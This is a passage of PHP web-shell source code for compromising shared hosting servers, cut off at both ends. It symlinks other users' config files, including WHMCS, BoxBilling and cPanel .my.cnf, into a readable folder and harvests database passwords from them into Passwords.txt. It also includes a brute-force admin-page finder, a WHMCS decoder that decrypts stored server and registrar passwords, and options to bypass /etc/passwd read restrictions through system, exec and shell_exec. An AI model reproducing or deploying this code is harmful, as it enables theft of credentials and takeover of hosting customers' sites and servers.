    @symlink('/home10/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home10/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home10/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home10/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home10/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home10/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
    @symlink('/home10/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
    }
    
    //password grab
    
    function entre2v2($text,$marqueurDebutLien,$marqueurFinLien)
    {
    
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[1]);
    $ar=trim($ar1[0]);
    return $ar;
    }
    
    $ffile=fopen('Passwords.txt','a+');
    
    
    $r= 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME'])."/pain_symconf/";
    $re=$r;
    $confi=array("-Wordpress.txt","-Joomla.txt","-WHMCS.txt","-Vbulletin.txt","-Other.txt","-Zencart.txt","-Hostbills.txt","-SMF.txt","-Drupal.txt","-OsCommerce.txt","-MyBB.txt","-PHPBB.txt","-IPB.txt","-BoxBilling.txt");
    
    $users=file("/etc/passwd");
    foreach($users as $user)
    {
    
    $str=explode(":",$user);
    $usersss=$str[0];
    foreach($confi as $co)
    {
    
    
    $uurl=$re.$usersss.$co;
    $uel=$uurl;
    
    $ch = curl_init();
    
    curl_setopt($ch, CURLOPT_URL, $uel);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8');
    $result['EXE'] = curl_exec($ch);
    curl_close($ch);
    $uxl=$result['EXE'];
    
    
    if($uxl && preg_match('/table_prefix/i',$uxl))
    {
    
    //Wordpress
    
    $dbp=entre2v2($uxl,"DB_PASSWORD', '","');");
    if(!empty($dbp))
    $pass=$dbp."\n";
    fwrite($ffile,$pass);
    
    }
    elseif($uxl && preg_match('/cc_encryption_hash/i',$uxl))
    {
    
    //WHMCS
    
    $dbp=entre2v2($uxl,"db_password = '","';");
    if(!empty($dbp))
    $pass=$dbp."\n";
    fwrite($ffile,$pass);
    
    }
    
    
    elseif($uxl && preg_match('/dbprefix/i',$uxl))
    {
    
    //Joomla
    
    $db=entre2v2($uxl,"password = '","';");
    if(!empty($db))
    $pass=$db."\n";
    fwrite($ffile,$pass);
    }
    elseif($uxl && preg_match('/admincpdir/i',$uxl))
    {
    
    //Vbulletin
    
    $db=entre2v2($uxl,"password'] = '","';");
    if(!empty($db))
    $pass=$db."\n";
    fwrite($ffile,$pass);
    
    }
    elseif($uxl && preg_match('/DB_DATABASE/i',$uxl))
    {
    
    //Other
    
    $db=entre2v2($uxl,"DB_PASSWORD', '","');");
    if(!empty($db))
    $pass=$db."\n";
    fwrite($ffile,$pass);
    }
    elseif($uxl && preg_match('/dbpass/i',$uxl))
    {
    
    //Other
    
    $db=entre2v2($uxl,"dbpass = '","';");
    if(!empty($db))
    $pass=$db."\n";
    fwrite($ffile,$pass);
    }
    elseif($uxl && preg_match('/dbpass/i',$uxl))
    {
    
    //Other
    
    $db=entre2v2($uxl,"dbpass = '","';");
    if(!empty($db))
    $pass=$db."\n";
    fwrite($ffile,$pass);
    
    }
    elseif($uxl && preg_match('/dbpass/i',$uxl))
    {
    
    //Other
    
    $db=entre2v2($uxl,"dbpass = \"","\";");
    if(!empty($db))
    $pass=$db."\n";
    fwrite($ffile,$pass);
    }
    
    
    }
    }
    echo "<center>
    <a href=\"pain_symconf/root/\">Root Server</a>
    <br><a href=\"pain_symconf/Passwords.txt\">Passwords</a>
    <br><a href=\"pain_symconf/\">Configurations</a></center>";
    }
    else
    {
    echo "<center>
    <form method=\"POST\">
    <textarea name=\"passwd\" class='area' rows='15' cols='60'>";
    $file = '/etc/passwd';
    $read = @fopen($file, 'r');
    if ($read){
    $body = @fread($read, @filesize($file));
    echo "".htmlentities($body)."";
    }
    elseif(!$read)
    {
    $read = @show_source($file) ;
    }
    elseif(!$read)
    {
    $read = @highlight_file($file);
    }
    elseif(!$read)
    {
    for($uid=0;$uid<1000;$uid++)
    {
    $ara = posix_getpwuid($uid);
    if (!empty($ara))
    {
    while (list ($key, $val) = each($ara))
    {
    print "$val:";
    }
    print "\n";
    }}}
    
    flush();
     
    echo "</textarea>
    <p><input name=\"m\" size=\"80\" value=\"Start\" type=\"submit\"/></p>
    </form></center>";
    }
    }
    
    } elseif(isset($_GET['do']) && ($_GET['do'] == 'adfin'))
    {
    ?>
    <form action="" method="post">
    
    <?php
    set_time_limit(0);
    error_reporting(0);
    $list['front'] ="admin
    adm
    admincp
    admcp
    cp
    modcp
    moderatorcp
    adminare
    admins
    cpanel
    controlpanel";
    $list['end'] = "admin1.php
    adm/
    _adm_
    _admin_
    _administrator_
    operator
    sika
    adminweb
    develop
    ketua
    redaktur
    author
    user
    users
    dinkesadmin
    retel
    panel
    paneladmin
    panellogin
    redaksi
    cp-admin
    Login@web
    admin1
    admin2
    admin3
    admin4
    admin5
    admin6
    admin7
    admin8
    admin9
    admin10
    master
    master/index.php
    master/login.php
    terasadmin/index.php
    terasadmin/login.php
    rahasia
    rahasia/login.php
    rahasia/admin.php
    rahasia/index.php
    dinkesadmin/login.php
    adminpmb
    adminpmb/index.php
    adminpmb/login.php
    system
    system/index.php
    system/login.php
    system/admin.php
    webadmin
    webadmin/index.php
    webadmin/login.php
    wpanel
    wpanel/index.php
    wpanel/login.php
    adminpanel
    adminpanel/index.php
    adminpanel/login.php
    adminkec
    adminkec/index.php
    adminkec/login.php
    admindesa
    admindesa/index.php
    admindesa/login.php
    adminkota
    adminkota/index.php
    adminkota/login.php
    admin123
    admin123/index.php
    admin123/login.php
    logout
    logout/index.php
    logout/login.php
    logout/admin.php
    adminweb_setting
    admin1.html
    admin
    administrator
    admin1.html
    admin2.php
    admin2.html
    yonetim.php
    yonetim.html
    yonetici.php
    yonetici.html
    ccms/
    ccms/login.php
    ccms/index.php
    maintenance/
    webmaster/
    adm/
    configuration/
    configure/
    websvn/
    admin/
    admin/account.php
    admin/account.html
    admin/index.php
    admin/index.html
    admin/login.php
    admin/login.html
    admin/home.php
    admin/controlpanel.html
    admin/controlpanel.php
    admin.php
    admin.html
    admin/cp.php
    admin/cp.html
    cp.php
    cp.html
    administrator/
    administrator/index.html
    administrator/index.php
    administrator/login.html
    administrator/login.php
    administrator/account.html
    administrator/account.php
    administrator.php
    administrator.html
    login.php
    login.html
    modelsearch/login.php
    moderator.php
    moderator.html
    moderator/login.php
    moderator/login.html
    moderator/admin.php
    moderator/admin.html
    moderator/
    account.php
    account.html
    controlpanel/
    controlpanel.php
    controlpanel.html
    admincontrol.php
    admincontrol.html
    adminpanel.php
    adminpanel.html
    admin1.asp
    admin2.asp
    yonetim.asp
    yonetici.asp
    admin/account.asp
    admin/index.asp
    admin/login.asp
    admin/home.asp
    admin/controlpanel.asp
    admin.asp
    admin/cp.asp
    cp.asp
    administrator/index.asp
    administrator/login.asp
    administrator/account.asp
    administrator.asp
    login.asp
    modelsearch/login.asp
    moderator.asp
    moderator/login.asp
    moderator/admin.asp
    account.asp
    controlpanel.asp
    admincontrol.asp
    adminpanel.asp
    fileadmin/
    fileadmin.php
    fileadmin.asp
    fileadmin.html
    administration/
    administration.php
    administration.html
    sysadmin.php
    sysadmin.html
    phpmyadmin/
    myadmin/
    sysadmin.asp
    sysadmin/
    ur-admin.asp
    ur-admin.php
    ur-admin.html
    ur-admin/
    Server.php
    Server.html
    Server.asp
    Server/
    wp-admin/
    administr8.php
    administr8.html
    administr8/
    administr8.asp
    webadmin/
    webadmin.php
    webadmin.asp
    webadmin.html
    administratie/
    admins/
    admins.php
    admins.asp
    admins.html
    administrivia/
    Database_Administration/
    WebAdmin/
    useradmin/
    sysadmins/
    admin1/
    system-administration/
    administrators/
    pgadmin/
    directadmin/
    staradmin/
    ServerAdministrator/
    SysAdmin/
    administer/
    LiveUser_Admin/
    sys-admin/
    typo3/
    panel/
    cpanel/
    cPanel/
    cpanel_file/
    platz_login/
    rcLogin/
    blogindex/
    formslogin/
    autologin/
    support_login/
    meta_login/
    manuallogin/
    simpleLogin/
    loginflat/
    utility_login/
    showlogin/
    memlogin/
    members/
    login-redirect/
    sub-login/
    wp-login.php
    login1/
    dir-login/
    login_db/
    xlogin/
    smblogin/
    customer_login/
    UserLogin/
    login-us/
    acct_login/
    admin_area/
    bigadmin/
    project-admins/
    phppgadmin/
    pureadmin/
    sql-admin/
    radmind/
    openvpnadmin/
    wizmysqladmin/
    vadmind/
    ezsqliteadmin/
    hpwebjetadmin/
    newsadmin/
    adminpro/
    Lotus_Domino_Admin/
    bbadmin/
    vmailadmin/
    Indy_admin/
    ccp14admin/
    irc-macadmin/
    banneradmin/
    sshadmin/
    phpldapadmin/
    macadmin/
    administratoraccounts/
    admin4_account/
    admin4_colon/
    radmind-1/
    Super-Admin/
    AdminTools/
    cmsadmin/
    SysAdmin2/
    globes_admin/
    cadmins/
    phpSQLiteAdmin/
    navSiteAdmin/
    server_admin_small/
    logo_sysadmin/
    server/
    database_administration/
    power_user/
    system_administration/
    ss_vms_admin_sm/
    adminarea/
    bb-admin/
    adminLogin/
    panel-administracion/
    instadmin/
    memberadmin/
    administratorlogin/
    admin/admin.php
    admin_area/admin.php
    admin_area/login.php
    siteadmin/login.php
    siteadmin/index.php
    siteadmin/login.html
    admin/admin.html
    admin_area/index.php
    bb-admin/index.php
    bb-admin/login.php
    bb-admin/admin.php
    admin_area/login.html
    admin_area/index.html
    admincp/index.asp
    admincp/login.asp
    admincp/index.html
    webadmin/index.html
    webadmin/admin.html
    webadmin/login.html
    admin/admin_login.html
    admin_login.html
    panel-administracion/login.html
    nsw/admin/login.php
    webadmin/login.php
    admin/admin_login.php
    admin_login.php
    admin_area/admin.html
    pages/admin/admin-login.php
    admin/admin-login.php
    admin-login.php
    bb-admin/index.html
    bb-admin/login.html
    bb-admin/admin.html
    admin/home.html
    pages/admin/admin-login.html
    admin/admin-login.html
    admin-login.html
    admin/adminLogin.html
    adminLogin.html
    home.html
    rcjakar/admin/login.php
    adminarea/index.html
    adminarea/admin.html
    webadmin/index.php
    webadmin/admin.php
    user.html
    modelsearch/login.html
    adminarea/login.html
    panel-administracion/index.html
    panel-administracion/admin.html
    modelsearch/index.html
    modelsearch/admin.html
    admincontrol/login.html
    adm/index.html
    adm.html
    user.php
    panel-administracion/login.php
    wp-login.php
    adminLogin.php
    admin/adminLogin.php
    home.php
    adminarea/index.php
    adminarea/admin.php
    adminarea/login.php
    panel-administracion/index.php
    panel-administracion/admin.php
    modelsearch/index.php
    modelsearch/admin.php
    admincontrol/login.php
    adm/admloginuser.php
    admloginuser.php
    admin2/login.php
    admin2/index.php
    adm/index.php
    adm.php
    affiliate.php
    adm_auth.php
    memberadmin.php
    administratorlogin.php
    admin/admin.asp
    admin_area/admin.asp
    admin_area/login.asp
    admin_area/index.asp
    bb-admin/index.asp
    bb-admin/login.asp
    bb-admin/admin.asp
    pages/admin/admin-login.asp
    admin/admin-login.asp
    admin-login.asp
    user.asp
    webadmin/index.asp
    webadmin/admin.asp
    webadmin/login.asp
    admin/admin_login.asp
    admin_login.asp
    panel-administracion/login.asp
    adminLogin.asp
    admin/adminLogin.asp
    home.asp
    adminarea/index.asp
    adminarea/admin.asp
    adminarea/login.asp
    panel-administracion/index.asp
    panel-administracion/admin.asp
    modelsearch/index.asp
    modelsearch/admin.asp
    admincontrol/login.asp
    adm/admloginuser.asp
    admloginuser.asp
    admin2/login.asp
    admin2/index.asp
    adm/index.asp
    adm.asp
    affiliate.asp
    adm_auth.asp
    memberadmin.asp
    administratorlogin.asp
    siteadmin/login.asp
    siteadmin/index.asp
    ADMIN/
    paneldecontrol/
    login/
    cms/
    admon/
    ADMON/
    administrador/
    ADMIN/login.php
    panelc/
    ADMIN/login.html";
    function template() {
    echo '
    
    <script type="text/javascript">
    <!--
    function insertcode($text, $place, $replace)
    {
        var $this = $text;
        var logbox = document.getElementById($place);
        if($replace == 0)
            document.getElementById($place).innerHTML = logbox.innerHTML+$this;
        else
            document.getElementById($place).innerHTML = $this;
    //document.getElementById("helpbox").innerHTML = $this;
    }
    -->
    </script>
    <br>
    <br>
    <h1 class="technique-two">
    
    
    
    </h1>
    
    <div class="wrapper">
    <div class="red">
    <div class="tube">
    <center><table class="tabnet"><th colspan="2">Admin Finder</th><tr><td>
    <form action="" method="post" name="xploit_form">
    
    <tr>
    <tr>
        <b><td>URL</td>
        <td><input class="inputz" type="text" name="xploit_url" value="'.$_POST['xploit_url'].'" style="width: 350px;" />
        </td>
    </tr><tr>
        <td>404 string</td>
        <td><input class="inputz" type="text" name="xploit_404string" value="'.$_POST['xploit_404string'].'" style="width: 350px;" />
        </td></b>
    </tr><br><td>
    <span style="float: center;"><input class="inputzbut" type="submit" name="xploit_submit" value=" Start Scan" align="center" />
    </span></td></tr>
    </form></td></tr>
    <br /></table>
    </div> <!-- /tube -->
    </div> <!-- /red -->
    <br />
    <div class="green">
    <div class="tube" id="rightcol">
    Verificat: <span id="verified">0</span> / <span id="total">0</span><br />
    <b>Found ones:<br /></b>
    </div> <!-- /tube -->
    </div></center><!-- /green -->
    <br clear="all" /><br />
    <div class="blue">
    <div class="tube" id="logbox">
    <br />
    <br />
    Admin page Finder :<br /><br />
    </div> <!-- /tube -->
    </div> <!-- /blue -->
    </div> <!-- /wrapper -->
    <br clear="all"><br>';
    }
    function show($msg, $br=1, $stop=0, $place='logbox', $replace=0) {
        if($br == 1) $msg .= "<br />";
        echo "<script type=\"text/javascript\">insertcode('".$msg."', '".$place."', '".$replace."');</script>";
        if($stop == 1) exit;
        @flush();@ob_flush();
    }
    function check($x, $front=0) {
        global $_POST,$site,$false;
        if($front == 0) $t = $site.$x;
        else $t = 'http://'.$x.'.'.$site.'/';
        $headers = get_headers($t);
        if (!eregi('200', $headers[0])) return 0;
        $data = @file_get_contents($t);
        if($_POST['xploit_404string'] == "") if($data == $false) return 0;
        if($_POST['xploit_404string'] != "") if(strpos($data, $_POST['xploit_404string'])) return 0;
        return 1;
    }
    
    // --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    template();
    if(!isset($_POST['xploit_url'])) die;
    if($_POST['xploit_url'] == '') die;
    $site = $_POST['xploit_url'];
    if ($site[strlen($site)-1] != "/") $site .= "/";
    if($_POST['xploit_404string'] == "") $false = @file_get_contents($site."d65897f5380a21a42db94b3927b823d56ee1099a-this_can-t_exist.html");
    $list['end'] = str_replace("\r", "", $list['end']);
    $list['front'] = str_replace("\r", "", $list['front']);
    $pathes = explode("\n", $list['end']);
    $frontpathes = explode("\n", $list['front']);
    show(count($pathes)+count($frontpathes), 1, 0, 'total', 1);
    $verificate = 0;
    foreach($pathes as $path) {
        show('Checking '.$site.$path.' : ', 0, 0, 'logbox', 0);
        $verificate++; show($verificate, 0, 0, 'verified', 1);
        if(check($path) == 0) show('not found', 1, 0, 'logbox', 0);
        else{
            show('<span style="color: #FFFFFF;"><strong>found</strong></span>', 1, 0, 'logbox', 0);
            show('<a href="'.$site.$path.'">'.$site.$path.'</a>', 1, 0, 'rightcol', 0);
        }
    }
    preg_match("/\/\/(.*?)\//i", $site, $xx); $site = $xx[1];
    if(substr($site, 0, 3) == "www") $site = substr($site, 4);
    foreach($frontpathes as $frontpath) {
        show('Checking http://'.$frontpath.'.'.$site.'/ : ', 0, 0, 'logbox', 0);
        $verificate++; show($verificate, 0, 0, 'verified', 1);
        if(check($frontpath, 1) == 0) show('not found', 1, 0, 'logbox', 0);
        else{
            show('<span style="color: #FFFFFF;"><strong>found</strong></span>', 1, 0, 'logbox', 0);
            show('<a href="http://'.$frontpath.'.'.$site.'/">'.$frontpath.'.'.$site.'</a>', 1, 0, 'rightcol', 0);
      }
    
    }
    }elseif($_GET['do'] == 'whmcs') {
    ?>
    <form action="" method="post">
    
    <?php
    
    function decrypt ($string,$cc_encryption_hash)
    {
        $key = md5 (md5 ($cc_encryption_hash)) . md5 ($cc_encryption_hash);
        $hash_key = _hash ($key);
        $hash_length = strlen ($hash_key);
        $string = base64_decode ($string);
        $tmp_iv = substr ($string, 0, $hash_length);
        $string = substr ($string, $hash_length, strlen ($string) - $hash_length);
        $iv = $out = '';
        $c = 0;
        while ($c < $hash_length)
        {
            $iv .= chr (ord ($tmp_iv[$c]) ^ ord ($hash_key[$c]));
            ++$c;
        }
        $key = $iv;
        $c = 0;
        while ($c < strlen ($string))
        {
            if (($c != 0 AND $c % $hash_length == 0))
            {
                $key = _hash ($key . substr ($out, $c - $hash_length, $hash_length));
            }
            $out .= chr (ord ($key[$c % $hash_length]) ^ ord ($string[$c]));
            ++$c;
        }
        return $out;
    }
    
    function _hash ($string)
    {
        if (function_exists ('sha1'))
        {
            $hash = sha1 ($string);
        }
        else
        {
            $hash = md5 ($string);
        }
        $out = '';
        $c = 0;
        while ($c < strlen ($hash))
        {
            $out .= chr (hexdec ($hash[$c] . $hash[$c + 1]));
            $c += 2;
        }
        return $out;
    }
    
    echo "
    <br><center><font size='5' color='#FFFFFF'><b>-=[ WHMCS Decoder ]=-</b></font></center>
    <center>
    <br>
    
    <FORM action=''  method='post'>
    <input type='hidden' name='form_action' value='2'>
    <br>
    <table class=tabnet style=width:320px;padding:0 1px;>
    <tr><th colspan=2>WHMCS Decoder</th></tr>
    <tr><td>db_host </td><td><input type='text' style='color:#FFFFFF;background-color:' class='inputz' size='38' name='db_host' value='localhost'></td></tr>
    <tr><td>db_username </td><td><input type='text' style='color:#FFFFFF;background-color:' class='inputz' size='38' name='db_username' value=''></td></tr>
    <tr><td>db_password</td><td><input type='text' style='color:#FFFFFF;background-color:' class='inputz' size='38' name='db_password' value=''></td></tr>
    <tr><td>db_name</td><td><input type='text' style='color:#FFFFFF;background-color:' class='inputz' size='38' name='db_name' value=''></td></tr>
    <tr><td>cc_encryption_hash</td><td><input style='color:#FFFFFF;background-color:' type='text' class='inputz' size='38' name='cc_encryption_hash' value=''></td></tr>
    <td>&nbsp;&nbsp;&nbsp;&nbsp;<INPUT class='inputzbut' type='submit' style='color:#FFFFFF;background-color:'  value='Submit' name='Submit'></td>
    </table>
    </FORM>
    </center>
    ";
    
     if($_POST['form_action'] == 2 )
     {
     //include($file);
     $db_host=($_POST['db_host']);
     $db_username=($_POST['db_username']);
     $db_password=($_POST['db_password']);
     $db_name=($_POST['db_name']);
     $cc_encryption_hash=($_POST['cc_encryption_hash']);
    
    
    
        $link=mysql_connect($db_host,$db_username,$db_password) ;
            mysql_select_db($db_name,$link) ;
    $query = mysql_query("SELECT * FROM tblservers");
    while($v = mysql_fetch_array($query)) {
    $ipaddress = $v['ipaddress'];
    $username = $v['username'];
    $type = $v['type'];
    $active = $v['active'];
    $hostname = $v['hostname'];
    echo("<center><table border='1'>");
    $password = decrypt ($v['password'], $cc_encryption_hash);
    echo("<tr><td>Type</td><td>$type</td></tr>");
    echo("<tr><td>Active</td><td>$active</td></tr>");
    echo("<tr><td>Hostname</td><td>$hostname</td></tr>");
    echo("<tr><td>Ip</td><td>$ipaddress</td></tr>");
    echo("<tr><td>Username</td><td>$username</td></tr>");
    echo("<tr><td>Password</td><td>$password</td></tr>");
    
    echo "</table><br><br></center>";
    }
    
        $link=mysql_connect($db_host,$db_username,$db_password) ;
            mysql_select_db($db_name,$link) ;
    $query = mysql_query("SELECT * FROM tblregistrars");
    echo("<center>Domain Reseller <br><table class=tabnet border='1'>");
    echo("<tr><td>Registrar</td><td>Setting</td><td>Value</td></tr>");
    while($v = mysql_fetch_array($query)) {
    $registrar     = $v['registrar'];
    $setting = $v['setting'];
    $value = decrypt ($v['value'], $cc_encryption_hash);
    if ($value=="") {
    $value=0;
    }
    $password = decrypt ($v['password'], $cc_encryption_hash);
    echo("<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>");
    }
    }
    }elseif($_GET['do'] == 'passwbypass') {
        echo '<center>Bypass etc/passw With:<br>
    <table style="width:50%">
      <tr>
        <td><form method="post"><input type="submit" value="System Function" name="syst"></form></td>
        <td><form method="post"><input type="submit" value="Passthru Function" name="passth"></form></td>
        <td><form method="post"><input type="submit" value="Exec Function" name="ex"></form></td>	
        <td><form method="post"><input type="submit" value="Shell_exec Function" name="shex"></form></td>		
        <td><form method="post"><input type="submit" value="Posix_getpwuid Function" name="melex"></form></td>
    </tr></table>Bypass User With : <table style="width:50%">
    <tr>
        <td><form method="post"><input type="submit" value="Awk Program" name="awkuser"></form></td>
        <td><form method="post"><input type="submit" value="System Function" name="systuser"></form></td>
        <td><form method="post"><input type="submit" value="Passthru Function" name="passthuser"></form></td>	
        <td><form method="post"><input type="submit" value="Exec Function" name="exuser"></form></td>		
        <td><form method="post"><input type="submit" value="Shell_exec Function" name="shexuser"></form></td>
    </tr>
    </table><br>';
    
    
    if ($_POST['awkuser']) {
    echo"<textarea class='inputzbut' cols='65' rows='15'>";
